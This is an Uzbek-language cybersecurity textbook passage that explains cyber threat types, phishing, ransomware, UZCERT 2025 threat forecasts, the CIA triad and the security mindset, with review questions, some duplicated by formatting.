Bugungi kunda internet texnologiyalari kundalik hayotimizning ajralmas qismiga aylangan. U orqali bank operatsiyalari bajariladi, davlat xizmatlari ko‘rsatiladi, ta’lim va sog‘liqni saqlash tizimlarida raqamli echimlar joriy etiladi. Ammo, bu qulayliklar bilan bir qatorda internet orqali yuzaga kelayotgan xavf va tahdidlar — xususan, kiberjinoyatlar, shaxsiy ma’lumotlarning o‘g‘irlanishi, zararli dasturlar va axborot manipulyatsiyalari — tobora ko‘paymoqda. Shunday sharoitda axborot xavfsizligini ta’minlash, fuqarolarning raqamli makondagi huquqlarini himoya qilish dolzarb masalaga aylangan.
Kibertahdid deganda kompyuter tizimlari, tarmoqlar, qurilmalar yoki ma’lumotlardagi zaifliklarni ishlatishga qaratilgan har qanday zararli faoliyat yoki potentsial xavf tushuniladi. Bunday tahdidlar shaxslar, jinoyat tashkilotlari, davlatlar yoki hatto tasodifiy ichki ishtirokchilar tomonidan kelib chiqishi mumkin bo‘lib, ular ko‘pincha operatsiyalarni buzish, maxfiy ma’lumotlarni o‘g‘irlash, moliyaviy zarar yetkazish yoki infratuzilmani buzishga qaratilgan. Kibertahdidlar sun’iy intellekt (AI), buyumlar interneti (IoT) va masofadan ishlash holatlarining ortishi bilan tez sur’atlarda rivojlanmoqda va buning natijasida kiberjinoyatlarning global xarajatlari yildan yilga ortib bormoqda.
Kibertahdidlar odatda bir necha mezonlar asosida tasniflanadi, jumladan, ularning tabiati (masalan, texnik va inson ishtirokli), maqsadi (masalan, moliyaviy foyda va josuslik), yetkazib berish usuli (masalan, elektron pochta va webga asoslangan) yoki ta’siri (masalan, buzilish va ma’lumot o‘g‘irlash). Quyida kibertahdidlarning eng keng tarqalgan tasnifi ko‘rsatilgan (1.3-rasm).

1.3-rasm. Kibertahdidlarning turlari
Zararli dasturlar, fishing, to‘lov dasturlari va ijtimoiy muhandislik
Zararli dastur va ularning turlari. Zararli dastur - fayl bо‘lib, kompyuter tizimiga tahdid qilish imkoniyatiga ega va troyanlar, viruslar, “qurt”lar kо‘rinishida bо‘lishi mumkin. 
Zararli dasturiy vositalari foydalanuvchining ruxsatisiz hujumchi kabi g‘arazli amallarni bajarishni maqsad qilgan vosita hisoblanib, ular yuklanuvchi kod (.exe), aktiv kontent, skript yoki boshqa kо‘rinishda bо‘lishi mumkin. Hujumchi zararli dasturiy vositalardan foydalangan holda tizim xafsizligini obrо‘sizlantirishi, kompyuter amallarini buzishi, maxfiy axborotni tо‘plashi, web saytdagi kontentlarni modifikatsiyalashi, о‘chirishi yoki qо‘shishi, foydalanuvchi kompyuteri boshqaruvini qо‘lga kiritishi mumkin. Bundan tashqari, zararli dasturlardan hukumat tashkilotlaridan va korporativ tashkilotlardan katta hajmdagi maxfiy axborotni olish uchun ham foydalanish mumkin. Zararli dasturlarning hozirda quyidagi kо‘rinishlari keng tarqalgan:
Viruslar: о‘zini о‘zi kо‘paytiradigan dastur bо‘lib, о‘zini boshqa dastur ichiga, kompyuterning yuklanuvchi sektoriga yoki hujjat ichiga biriktiradi;
Troyan otlari: bir qarashda yaxshi va foydali kabi kо‘rinuvchi dasturiy vosita sifatida о‘zini kо‘rsatsada, yashiringan zararli koddan iborat;
Adware: marketing maqsadida yoki reklamani namoyish qilish uchun foydalanuvchi faoliyatini kuzatib boruvchi dasturiy ta’minot;
Spyware: foydalanuvchi ma’lumotlarini qо‘lga kirituvchi va uni hujumchiga yuboruvchi dasturiy kod;
Rootkits: ushbu zararli dasturiy vosita operatsion tizim tomonidan aniqlanmasligi uchun о‘z harakatlarini yashiradi;
Backdoors: zararli dasturiy kodlar bо‘lib, hujumchiga autentifikatsiyani amalga oshirmasdan, aylanib о‘tib tizimdan foydalanish imkonini beradi, masalan, ma’mur parolisiz imtiyozga ega bо‘lish;
Mantiqiy bombalar: zararli dasturiy vosita bо‘lib, biror mantiqiy shart qanoatlantirilgan vaqtda о‘z harakatini amalga oshiradi;
Botnet: Internet tarmog‘idagi obrо‘sizlantirilgan kompyuterlar bо‘lib, taqsimlangan hujumlarni amalga oshirish uchun hujumchi tomonidan foydalaniladi;
Ransomware: mazkur zararli dasturiy ta’minot qurbon kompyuterida mavjud qimmatli fayllarni shifrlaydi yoki qulflab qо‘yib, tо‘lov amalga oshirilishini talab qiladi.
Ijtimoiy muhandislik va fishing.  Odatda “insonni aldab boshqarish” (human hacking) deb ataladigan ijtimoiy muhandislik odamlarni maxfiy ma’lumotlarni oshkor qilishga, o‘zining yoki tashkilotining moliyaviy xavfsizligiga tahdid soluvchi harakatlarni bajarishga yoki shaxsiy hamda tashkiliy xavfsizlikni xavf ostiga qo‘yishga majburlovchi manipulyatsiya usullaridan iborat.
Fishing - ijtimoiy muhandislikning eng mashhur va keng tarqalgan ko‘rinishidir. Fishing firibgarlar tomonidan yuborilgan soxta elektron pochta xabarlari, fayl-ilovalar, SMS yoki telefon qo‘ng‘iroqlari orqali odamlarni quyidagilarga aldab majbur qiladi: 
	•	shaxsiy ma’lumotlar yoki login-parollarni ulashish;
	•	zararli dasturlarni yuklab olish;
	•	kiberjinoyatchilarga pul o‘tkazish;
	•	yoki ularni kiberhujumlarga duchor qiladigan boshqa harakatlarni bajarish.
Fishingning keng tarqalgan turlari:
Spear fishing: muayyan bir shaxsga qaratilgan aniq va yuqori darajada maqsadli fishing hujumlari. Ko‘pincha qurbonning ijtimoiy tarmoqlardagi ochiq ma’lumotlari asosida hujum yanada ishonchli qilib ko‘rsatiladi.
Whale fishing: yuqori lavozimli rahbarlar yoki boy shaxslarni nishonga oluvchi spear fishingning maxsus turi.
Business Email Compromise (BEC): bunda kiberjinoyatchilar o‘zini rahbar, yetkazib beruvchi yoki ishonchli biznes hamkori sifatida tanishtirib, qurbonni pul o‘tkazish yoki maxfiy ma’lumot ulashishga aldaydi.
Yana bir keng tarqalgan ijtimoiy muhandislik usuli — domen nomini soxtalashtirishdir (DNS spoofing). Bunda kiberjinoyatchi haqiqiy web-saytga o‘xshash soxta sayt yoki domen yaratadi, masalan, “applesupport.com” orqali foydalanuvchini asl support.apple.com o‘rniga soxta saytda ma’lumot kiritishga majbur qiladi.
Fishing xatlari ko‘pincha soxtalashtirilgan jo‘natuvchi domenlaridan foydalanadi, bu esa xatni yanada ishonchli va haqiqiy ko‘rinishda ko‘rsatadi.
To‘lov dasturlarga asoslangan kibertahdidlar. To‘lov dasturlari asosida sodir etiladigan kiberhujumlar odatda foydalanuvchi va tizim o‘rtasidagi ishonchli jarayonni buzish orqali amalga oshiriladi. Hujumchi avval fishing yoki soxta to‘lov sahifasi orqali qurbonning karta ma’lumotlari, login yoki SMS-kodlarini qo‘lga kiritadi. Keyin zararli dastur yoki tarmoqni ushlash orqali tranzaksiya ma’lumotlarini o‘zgartiradi yoki yashirin to‘lovni yo‘naltiradi. Oxirgi bosqichda hujumchi olingan ma’lumotlardan foydalanib, noqonuniy tranzaksiyalarni bajaradi yoki qayd yozuvini (akkauntni) egallaydi. Natijada foydalanuvchi mablag‘lari yo‘qotiladi va tizimning ishonchliligi izdan chiqadi.
Kibertahdidlarni amalga oshirishda asosiy maqsad va motivatsiyalar
Kibertahdidlarni amalga oshirishda asosiy maqsad va motivatsiyalar bir nechta omillardan iborat bo‘lib, ular hujumchilarning texnik imkoniyatlari va manfaatlariga qarab farqlanadi. Eng keng tarqalgan motivatsiya — moliyaviy foyda, ya’ni bank kartalarini o‘g‘irlash, to‘lov tizimlarini buzish yoki garov (ransomware) evaziga pul talab qilish. Shaxsiy yoki siyosiy manfaatlar ham sabab bo‘lishi mumkin, masalan, davlat tashkilotlariga qarshi hujumlar, norozilik aksiyalarini raqamli shaklda o‘tkazish yoki raqobatchi kompaniyaga zarar yetkazish. Ba’zi hujumchilarni josuslik motivatsiyasi — sanoat sirlarini, strategik texnologiyalarni yoki maxfiy hujjatlarni qo‘lga kiritish rag‘batlantiradi. Shuningdek, ayrim kiberjinoyatchilar obro‘ orttirish, texnik mahoratini namoyish qilish yoki tizimlarni sinab ko‘rish kabi psixologik omillar tufayli ham hujumlarni amalga oshiradi.
Kibertahdidlar bo‘yicha so‘ngi statistik ma’lumotlar
E’tiborlaringizga UZCERT kiberxavfsizlik hodisalariga chora ko‘rish xizmati tomonidan 2025-yilda bashorat qilingan kibertahdidlar haqidagi ma’lumotlar taqdim etiladi.
Kibertahdidlar butun dunyoda, jumladan, O‘zbekistonda ham tezlik bilan o‘sib bormoqda. 2024-yildagi global kiberxavfsizlik tendensiyalari kibertahdidlarning tobora murakkablashib va kuchayib borayotganini ko‘rsatdi. Kiberjinoyatchilikdan dunyo bo‘ylab keltiriladigan zarar 9,5 trillion AQSH dollarini tashkil etadi va 2025-yilga borib bu ko‘rsatkich 10,5 trillionga yetishi kutilmoqda. Xususan, 2024-yilning o‘zida O‘zbekistonda 60 mingga yaqin kibertahdidlar va  119 ta kiberxavfsizlikni buzulishi bilan bog‘liq hodisalar qayd etildi. Mutaxassislar tahliliga ko‘ra, asosiy kibertahdidlar va hodisalar “Bank va moliya sektori”, “Ishlab chiqarish”, “Energetika” va “AKT” sohalarida kuzatildi. Bu ko‘rsatkichlar mamlakatda kiberjinoyatchilik va axborot xavfsizligiga bo‘lgan tahdidlar darajasining yuqoriligini ko‘rsatadi hamda 2025-yilda ushbu sohalarga bo‘lgan e’tibor va xavfsizlik choralarini yanada kuchaytirish zarurligini ta’kidlaydi.
Mazkur xizmat tomonidan 2025-yilda O‘zbekiston uchun eng dolzarb bo‘lishi kutilgan kibertahdidlar sifatida quyidagilar ko‘rsatilgan:
1. Fishing, ijtimoiy muhandislik va “deepfake” hujumlari. Kiberjinoyatchilar odamlarning shaxsiy ma’lumotlarini olish yoki ularni aldash uchun elektron pochta, ijtimoiy tarmoqlar yoki “deepfake” texnologiyalaridan foydalangan holda fishing va ijtimoiy muhandislik hujumlarini kuchaytirishadi. “Deepfake” yordamida ular ishonchli video yoki audio materiallar yaratish orqali odamlarning ma’lumotlarini olishda yanada samarali bo‘lishi kutilmoqda. Bu taktikalar jamiyat uchun katta tahdid solib, kiberxavfsizlikka oid jiddiy masalalarni keltirib chiqarishi mumkin.
2. Mobil qurilmalarga hujumlar. Smartfonlar va planshetlardan foydalanish darajasi oshib borayotgani sababli, zararli dasturlar orqali mobil qurilmalarga hujumlar ko‘payishi mumkin. Bu hujumlar, asosan, bank ma’lumotlari va shaxsiy ma’lumotlarga qaratiladi.
3. Tovlamachi-viruslar (ransomware) hujumlari. Tovlamachi-viruslar hujumlari – kompyuter tizimlarini bloklab, ma’lumotlarni qaytarish uchun tovon puli talab qilish – 2025-yilda ham katta xavf tug‘dirgan. Korxonalar va davlat muassasalari asosiy maqsadga aylanadi.
4. 5G va IoT qurilmalariga hujumlar. 5G va internetga ulangan qurilmalar (IoT) tarmog‘ining kengayishi kibertahdidlarga yangi eshik ochadi. Himoyasiz bo‘lgan qurilmalar kiberjinoyatchilarning yangi nishonlariga aylanishi mumkin.
5. Insayder tahdidlari. Inson omillari – xato yoki qasddan qilingan xatolar – katta ma’lumotlarga ega tashkilotlar uchun katta xavf bo‘lib qoladi. Ichki xodimlar tomonidan sodir etilgan kiberxavflar 2025-yilda ko‘proq uchrashi ehtimoldan holi emas.
6. Kritik infratuzilmaga hujumlar. Energetika, transport, sog‘liqni saqlash kabi kritik infratuzilmalar kiberhujumlarning asosiy nishonlaridan biri bo‘lishi mumkin. Davlat muassasalari va xususiy sektorning himoya choralari kuchaytirilishi kerak.
	Kibertahdid deganda nimani tushunasiz?
	•	Kibertahdidlarni qanday guruhlarga ajratish mumkin?
	•	Zararli dasturlar va ularni turlari haqida ma’lumot bering?
	•	Ijtimoiy muhandislik va fishing tahdidlarini tushuntiring?
	•	Kibertahdidlar hajmini ortishiga nima sabab bo‘lmoqda?
	•	Kibertahdidlar hajmini ortishiga nimalar motivatsiya bo‘lib xizmat qilmoqda?
	•	Kibertahdidlarga oid so‘ngi statistik ma’lumotlarni ayting?
	•	UZCERT xizmati tomonidan 2025-yilda respublikamizda kuzatilishi mumkin bo‘lgan kibertahdidlar haqida ma’lumot bering?

Nazorat savollari

	•	Kibertahdid deganda nimani tushunasiz?
	•	Kibertahdidlarni qanday guruhlarga ajratish mumkin?
	•	Zararli dasturlar va ularni turlari haqida ma’lumot bering?
	•	Ijtimoiy muhandislik va fishing tahdidlarini tushuntiring?
	•	Kibertahdidlar hajmini ortishiga nima sabab bo‘lmoqda?
	•	Kibertahdidlar hajmini ortishiga nimalar motivatsiya bo‘lib xizmat qilmoqda?
	•	Kibertahdidlarga oid so‘ngi statistik ma’lumotlarni ayting?
	•	UZCERT xizmati tomonidan 2025-yilda respublikamizda kuzatilishi mumkin bo‘lgan kibertahdidlar haqida ma’lumot bering?

Nazorat savollari
1.3. CIA uchligi  (Ma’ruza mashg‘uloti)
CIA uchligi: Confidentiality (konfidensiallik), Integrity (yaxlitlik), Availability (foydalanuvchanlik) tushunchalari. 
	•	Turli shart va holatlar uchun ushbu 3 omilni muhimligi. 
Reja:
	•	CIA uchligi: Confidentiality (konfidensiallik), Integrity (yaxlitlik), Availability (foydalanuvchanlik) tushunchalari. 
	•	Turli shart va holatlar uchun ushbu 3 omilni muhimligi. 
Reja:

Konfidensiallik, maxfiylik, yaxlitlik, foydalanuvchanlik, CIA.
Kalit so‘zlar:
Konfidensiallik, maxfiylik, yaxlitlik, foydalanuvchanlik, CIA.
Kalit so‘zlar:
CIA uchligi: Confidentiality (konfidensiallik), Integrity (yaxlitlik), Availability (foydalanuvchanlik) tushunchalari
“CIA” uchligidagi uch harf Confidentiality (konfidensiallik yoki maxfiylik), Integrity (yaxlitlik) va Availability (Foydalanuvchanlik) tushunchalarini anglatadi. CIA uchligi - bu xavfsizlik tizimlarini ishlab chiqishda asos bo‘lib xizmat qiladigan keng qo‘llaniladigan model hisoblanadi. Ushbu model zaifliklarni aniqlash va ularga yechimlar topish usullarini aniqlash maqsadida qo‘llanadi.
Ma’lumotlarning maxfiyligi, yaxlitligi va foydalanuvchanligi biznes faoliyati uchun nihoyatda muhim bo‘lib, CIA uchligi bu uch g‘oyani alohida diqqat markazlariga ajratadi. Bularni farqlash muhim hisoblanib, u xavfsizlik xodimlariga har bir muammoni qanday hal qilish bo‘yicha yo‘nalish beradi.
Ideal holatda, ushbu uchta mezon to‘liq ta’minlanganida, tashkilotning xavfsizlik profili yanada mustahkam bo‘ladi va turli tahdidlarga qarshi samaraliroq himoyalanish imkonini beradi.
Konfidensiallik – axborot yoki uni eltuvchisining shunday holatiki, undan ruxsatsiz tanishishning yoki nusxalashning oldi olingan bo‘ladi. Konfidensiallik axborotni ruxsatsiz “o‘qish”dan himoyalash bilan shug‘ullanadi. AOB senariysida Bob uchun konfidensiallik juda muhim. Ya’ni, Bob o‘z balansida qancha pul borligini Tridining bilishini istamaydi. Shu sababli Bob uchun balans xususidagi ma’lumotlarning konfidensialligini ta’minlash muhim hisoblanadi.
Yaxlitlik – axborotning buzilmagan ko‘rinishida (axborotning qandaydir qayd etilgan holatiga nisbatan o‘zgarmagan shaklda) mavjud bo‘lishi ifodalangan xususiyati. Yaxlitlik axborotni ruxsatsiz “yozish” dan (ya’ni, axborotni o‘zgartirishdan) himoyalash yoki kamida o‘zgartirilganligini aniqlash bilan shug‘ullanadi. AOB senariysida Alisaning banki qayd yozuvining yaxlitligini Trididan himoyalash shart. Masalan, Bob o‘zining akkauntida balansning o‘zgarishidan yoki Alisa akkauntida balansning oshishidan himoyalashi shart.
Shu o‘rinda konfidensiallik va yaxlitlik bir xil tushuncha emasligiga e’tibor berish kerak. Masalan, Tridi biror ma’lumotni o‘qiy olmagan taqdirda ham uni sezilmaydigan darajada o‘zgartirishi mumkin.
Foydalanuvchanlik – avtorizatsiyalangan mantiqiy obyekt so‘rovi bo‘yicha axborotning tayyorlik va foydalanuvchanlik holatida bo‘lishi xususiyati. Foydalanuvchanlik axborotni (yoki tizimni) ruxsatsiz “bajarmaslik” dan himoyalash bilan shug‘ullanadi. AOB senariysida AOB web saytidan Bobning foydalana olmasligi Alisaning banki va Bob uchun foydalanuvchanlik muammosi hisoblanadi. Sababi, mazkur holda Alisa pul o‘tkazmalaridan daromad ola olmaydi va Bob esa o‘z biznesini amalga oshira olmaydi. Foydalanuvchanlikni buzishga qaratilgan hujumlardan eng keng tarqalgani – xizmat ko‘rsatishdan voz kechishga undovchi hujum (Denial of service, DoS).
Turli shart va holatlar uchun ushbu 3 omilni muhimligi
Maxfiylikni ta’minlashning asosiy elementi — tegishli ruxsati bo‘lmagan foydalanuvchilarning muhim bo‘lgan resurslardan foydalanishini cheklashdir. Aksincha, samarali tizim ma’lumotdan foydalanishi kerak bo‘lgan xodimlarga zarur ruxsatlarni taqdim etishi ham lozim.
Masalan, tashkilotning moliya masalalari bilan shug‘ullanadiganlar jadvallar, bank hisoblari va pul oqimiga taalluqli boshqa ma’lumotlardan foydalana olishi kerak. Ammo, boshqa xodimlarning katta qismi — hatto ba’zi rahbarlar ham — bu ma’lumotlardan foydalanishga ruxsati olmasligi mumkin. Ushbu siyosatlarga rioya qilinishini ta’minlash uchun kim nimani ko‘ra olishini qat’iy cheklaydigan qoidalar joriy etilishi zarur.
Maxfiylik turli usullar bilan buzilishi mumkin. Bunday holatlar, masalan, ruxsatsiz foydalanish uchun tizimlarga bevosita hujumlar qilinishini o‘z ichiga olishi mumkin. Yoki xaker ilova yoki ma’lumotlar bazasiga kirishga urinib, ma’lumotlarni o‘g‘irlashi yoki o‘zgartirishi ham mumkin.
Bunday to‘g‘ridan-to‘g‘ri hujumlar maxsus usullar yordamida amalga oshirilishi mumkin — bunda hujumchi ma’lumotlar oqimining o‘rtasiga joylashib, axborotni tutib qoladi va uni o‘g‘irlaydi yoki o‘zgartiradi. Ba’zi xakerlar tarmoqni kuzatishning boshqa usullaridan foydalanib, login ma’lumotlarini qo‘lga kiritishga harakat qiladi. Ba’zan hujumchi yanada yuqori darajadagi ruxsatlarni qo‘lga kiritish uchun tizimdagi imtiyozlarni oshirishga urinadi.
Biroq, maxfiylikning buzilishi hamisha qasddan bo‘lmaydi. Insonlar tomonidan qilinadigan xatolar yoki yetarli xavfsizlik choralarining yo‘qligi ham bunga sabab bo‘lishi mumkin. Masalan, kimdir ishchi kompyuteriga yoki maxsus himoyalangan hududga kirish uchun mo‘ljallangan parolini himoya qilolmasligi mumkin. Foydalanuvchilar o‘z login ma’lumotlarini boshqalar bilan ulashib yuborishi, yoki tizimga kirayotganda boshqalarga parolini ko‘rsatib qo‘yishi mumkin. Ba’zi holatlarda foydalanuvchi xabarni to‘g‘ri shifrlanmagan bo‘lishi mumkin, natijada hujumchi ma’lumotni tutib oladi. Shuningdek, o‘g‘ri kompyuterni yoki tizimga kirishda ishlatiladigan qurilmani o‘g‘irlab, maxfiy ma’lumotlarga kirib olishi ham mumkin.
Yaxlitlik — bu ma’lumotlarni to‘g‘riligi va o‘zgartirilmaganligiga ishonch hosil qilish jarayonidir. Ma’lumotning yaxlitligi faqatgina u haqiqiy, aniq va ishonchli bo‘lgandagina saqlanadi.
Masalan, agar kompaniyangiz web-saytingizda yuqori lavozimli rahbarlar haqida ma’lumot berayotgan bo‘lsa, ushbu ma’lumot yaxlit bo‘lishi kerak. Agar u noto‘g‘ri bo‘lsa, ma’lumot izlayotgan tashrifchilar tashkilotingizni ishonchsiz deb o‘ylashi mumkin. Sizning tashkilotingiz obro‘siga ziyon yetkazishni xohlovchi kimdir web-saytingizga xakerlik hujumini uyushtirib, rahbarlarning tavsiflari, suratlari yoki lavozimlarini o‘zgartirib, ularning yoki butun kompaniyaning obro‘siga putur yetkazishga urinishi mumkin.
Yaxlitlik xususiyati ko‘pincha ataylab buziladi. Hujumchi himoya tizimini chetlab o‘tishi, fayl konfiguratsiyalarini o‘zgartirib ruxsatsiz foydalanishga yo‘l ochishi yoki hujumni yashirish uchun tizim yuritadigan log fayllarni o‘zgartirishi mumkin. Yaxlitlik tasodifan ham buzilishi mumkin: kimdir noto‘g‘ri kodni kiritishi yoki beparvolik bilan xato qilishi sababli. Shuningdek, agar kompaniyaning xavfsizlik siyosatlari, himoyalari va tartiblari yetarli bo‘lmasa, yaxlitlik hech kimning bevosita aybiga bog‘liq bo‘lmagan holda buzilishi mumkin.
Ma’lumot maxfiy saqlansa va uning yaxlitligi ta’minlansa ham, tashkilot foydalanuvchilari yoki mijozlar undan foydalana olmasa, bu ma’lumot ko‘pincha befoyda bo‘lib qoladi. Bu shuni anglatadiki, tizimlar, tarmoqlar va ilovalar kerak bo‘lganda va kerakli tarzda ishlashi lozim. Shuningdek, ba’zi ma’lumotlardan foydalanish huquqiga ega bo‘lgan shaxslar uni zarur paytda olishi mumkin bo‘lishi va bu jarayon ortiqcha vaqt talab qilmasligi zarur.
Masalan, elektr ta’minoti uzilib, muhim tizimlarga qayta kirishni ta’minlaydigan avariyali tiklash tizimi mavjud bo‘lmasa, foydalanuvchanlik buziladi. Shuningdek, toshqin yoki kuchli qor bo‘roni kabi tabiiy ofatlar xodimlarning ofisga kelishiga to‘sqinlik qilishi mumkin, natijada ish stansiyalari yoki biznes uchun muhim ilovalar va ma’lumotlarni taqdim etuvchi boshqa qurilmalardan foydalanish to‘xtab qoladi. Foydalanuvchanlikka ataylab qilingan hujumlar ham putur yetkazishi mumkin — masalan, xizmat ko‘rsatishni rad etish (DoS) hujumlari yoki ransomware orqali.
Foydalanuvchanlikni ta’minlash uchun tashkilotlar zaxira (redundant) tarmoqlar, serverlar va ilovalardan foydalanishlari mumkin. Bular asosiy tizim ishdan chiqqanda avtomatik ravishda ishga tushishi mumkin. Shuningdek, dasturiy ta’minot paketlari va xavfsizlik tizimlarini o‘z vaqtida yangilab borish orqali foydalanuvchanlikni oshirish mumkin. Bu ilovalar nosoz ishlashining yoki yangi tahdidlarning tizimga kirib kelishining oldini oladi. Zaxira nusxalar va to‘liq avariyali tiklash rejalari esa salbiy hodisalardan so‘ng kompaniyaning tezda normal holatga qaytishiga yordam beradi.
Quyida CIA uchlik tushunchalarini muhim ekanligini ko‘rsatuvchi hayotiy misollar keltiriladi.
Konfidensiallik:  Ma’lumot faqat ruxsat berilgan shaxslar tomonidan ko‘rilishi kerak.
	•	Bank hisob raqamlari va PIN-kodlar: faqat egasi va bank xodimlari ko‘ra oladi. Agar boshqa odamlar bu ma’lumotlarni bilsa, moliyaviy zarar yetishi mumkin.
	•	Shifokorlar ma’lumotlari: kasallik tarixi yoki tibbiy test natijalari maxfiy saqlanishi lozim. Ruxsatsiz shaxslar ularni o‘qiy olmaydi.
	•	Tashkilot sirlari: masalan, yangi mahsulotning ishlab chiqilishi bo‘yicha strategiya faqat kompaniya xodimlariga ochiq bo‘lishi lozim.
Yaxlitlik: ma’lumot to‘g‘ri, o‘zgarmagan va ishonchli bo‘lishi kerak.
	•	Elektron bank tranzaksiyalari: agar mablag‘ miqdori yoki hisob raqami noto‘g‘ri o‘zgarsa, moliyaviy yo‘qotish yuz beradi.
	•	Onlayn savdo saytlaridagi buyurtmalar: buyurtma ma’lumotlari (miqdor, manzil, narx) o‘zgarmasligi kerak, aks holda mijozlar va kompaniya zarar ko‘radi.
	•	Tibbiy hisobotlar: test natijalari o‘zgartirilmasligi kerak, noto‘g‘ri natija davolashni noto‘g‘ri yo‘naltirishi mumkin.
Foydalanuvchanlik: ma’lumot va tizimlardan zarur paytda foydalanish mumkin bo‘lishi kerak.
	•	Online banking va mobil ilovalar: foydalanuvchilar kerak bo‘lganda hisobni tekshira va mablag‘ yuborishi mumkin bo‘lishi kerak.
	•	Elektron sog‘liqni saqlash tizimi: shifokorlar va kasalxonalar tizim ishlamasa, bemorlarni davolashda kechikish yuz berishi mumkin.
	•	Favqulodda xizmatlar: masalan, 101, 102 yoki 103 tez yordam raqamlari ishlamasligi hayot uchun xavf tug‘diradi.
	CIA uchligini tashkil etuvchi tushunchalarni ayting?
	•	Maxfiylik yoki konfidensiallik deyilganda nimani tushunasiz?
	•	Axborotni yaxlitligi deyilganda nimani tushunasiz?
	•	Axborotni foydalanuvchanligi deyilganda nima tushunasiz?
	•	Maxfiylikni ta’minlash muhim bo‘lgan holatlarga misollar ayting?
	•	Yaxlitlikni ta’minlash muhim bo‘lgan holatlarga misollar ayting?
	•	Foydalanuvchanlikni ta’minlash muhim bo‘lgan holatlarga misollar ayting?
	•	
	•	
Nazorat savollari

	•	CIA uchligini tashkil etuvchi tushunchalarni ayting?
	•	Maxfiylik yoki konfidensiallik deyilganda nimani tushunasiz?
	•	Axborotni yaxlitligi deyilganda nimani tushunasiz?
	•	Axborotni foydalanuvchanligi deyilganda nima tushunasiz?
	•	Maxfiylikni ta’minlash muhim bo‘lgan holatlarga misollar ayting?
	•	Yaxlitlikni ta’minlash muhim bo‘lgan holatlarga misollar ayting?
	•	Foydalanuvchanlikni ta’minlash muhim bo‘lgan holatlarga misollar ayting?
	•	
	•	
Nazorat savollari
1.4. Xavfsizlik tafakkuri  (Ma’ruza mashg‘uloti)
Xavfsizlik tafakkuri nima? 
	•	Xavfsizlik tafakkuri nima uchun kerak? 
	•	Xavfsizlik tafakkurining asosiy tamoyillari. 
	•	Xavfsizlik tafakkurini shakllantirish usullari.
Reja:
	•	Xavfsizlik tafakkuri nima? 
	•	Xavfsizlik tafakkuri nima uchun kerak? 
	•	Xavfsizlik tafakkurining asosiy tamoyillari. 
	•	Xavfsizlik tafakkurini shakllantirish usullari.
Reja:

Xavfsizlik tafakkuri (security mindset), hujumchi kabi firklash, himoyachi kabi fikrlash, Red team va Blue team, aktiv, tahdidni modellashtirish, CTF (Capture The Flag), axborot xavfsizligi.
Kalit so‘zlar
Xavfsizlik tafakkuri (security mindset), hujumchi kabi firklash, himoyachi kabi fikrlash, Red team va Blue team, aktiv, tahdidni modellashtirish, CTF (Capture The Flag), axborot xavfsizligi.
Kalit so‘zlar
Xavfsizlik tafakkuri nima
Bugungi kunda axborot texnologiyalarining jadal rivojlanishi nafaqat ishlab chiqarish va boshqaruv jarayonlarini avtomatlashtirishga, balki ularga nisbatan yangi turdagi xavf va tahdidlarning paydo bo‘lishiga ham olib kelmoqda. Axborot xavfsizligi masalasi korxona rahbarlari uchun strategik ustuvor yo‘nalishlardan biriga aylangan bo‘lsada, ko‘plab tadbirkorlar hali ham bu mavzuga yetarlicha e’tibor bermaydilar.
Tashkilotlar rahbarlari orasida: “Biz kichik biznes faoliyatga egamiz, bizga hech kim xakerlik hujumi qilmaydi” yoki “Biz allaqachon xavfsizmiz, qo‘shimcha vaqt va resurs sarflashning nima keragi bor?” kabi fikrlarni tez-tez eshitish mumkin.
Aslida esa bunday qarashlar xavfli hisoblanadi. So‘nggi yillarda kiberhujumlar, ma’lumotlarni sizib chiqishi, ransomware hujumlarining keskin oshgani shuni ko‘rsatadiki, har qanday korxona (uning hajmi, daromadi yoki faoliyat yo‘nalishidan qat’iy nazar) potensial nishondir.
Statistik ma’lumotlar shuni ko‘rsatadiki, muvaffaqiyatli kiberhujumlarning 95% inson omiliga borib taqaladi. Ya’ni, xodimning bitta chalg‘ishi, shubhali havolani bosishi yoki elektron pochta xabarini tekshirmasdan ochishi kompaniya uchun millionlab zarar keltirishi mumkin. Bu shuni anglatadiki: dasturiy himoya kuchli bo‘lishi mumkin; tarmoqlararo ekran vositalari, IDS/IPS tizimlari mavjud bo‘lishi mumkin; ammo xodimlar xavfsizlik fikrlash tarziga ega bo‘lmasa, barcha himoya qatlamlari befoyda bo‘lib qoladi. Shuning uchun axborot xavfsizligi - bu faqat texnik vositalar majmuasi emas ekanligini anglash lozim.
Axborot xavfsizligi - bu tashkiliy madaniyat, tashkilotning umumiy fikrlash tarzi va xulq-atvoridir. 
Xavfsizlik tafakkuri (security mindset) - bu xodimlarning har bir harakatni potentsial xavf nuqtai nazaridan baholashga odatlanishidir. Bu quyidagilarni o‘z ichiga oladi:
	•	har qanday shubhali xabar yoki havolani tekshirish;
	•	qo‘shimcha xavfsizlik choralarini tabiiy qabul qilish;
	•	ichki siyosatlarga qat’iy rioya qilish;
	•	“menga nima bo‘lardi?” emas, balki “kompaniyaga qanday zarar yetishi mumkin?” tarzida fikrlash.
Bu fikrlash tarzi tasodifan shakllanmaydi. U puxta yo‘lga qo‘yilgan siyosat, muntazam o‘qitish va xabardorlik orqali shakllanadi. Amerikalik axborot xavfsizlik bo‘yicha mutaxassis Bryus Shnayer quyidagi fikrni bildirgan: “Xavfsizlik o‘ziga xos fikrlash tarzini talab qiladi. Xavfsizlik bo‘yicha mutaxassislar — hech bo‘lmaganda yaxshi mutaxassislar — dunyoni boshqacha ko‘radilar. Ular do‘konga kirsa, qanday qilib o‘g‘irlik qilish mumkinligini sezmasdan ilojlari yo‘q. Kompyuterdan foydalansa, xavfsizlikdagi zaifliklar haqida o‘ylamasdan turolmaydi. Ular ovoz berayotganida, qanday qilib ikki marta ovoz berish mumkinligini o‘ylab ko‘rmasdan turolmaydilar. Ular bunga qarshi hech narsa qila olmaydi”.
Kiberxavfsizlik bo‘yicha malakali mutaxassislar tanqisligi — ya’ni kiberxavfsizlikdagi “ko‘nikmalar bo‘shlig‘i” (skills gap) — bugungi kunda butun dunyo uchun dolzarb muammo hisoblanadi. So‘nggi statistik ma’lumotlarga ko‘ra, dunyo bo‘yicha taxminan 2,72 million kiberxavfsizlik bo‘yicha ish o‘rinlariga ehtiyoj mavjud. Kiberxavfsizlikka bo‘lgan talabni qondirish uchun ushbu soha bo‘yicha mutaxassislikni aniq belgilanadigan va rivojlantiriladigan tarkibiy ko‘nikma hamda sifatlargacha bo‘lib chiqish zarur.
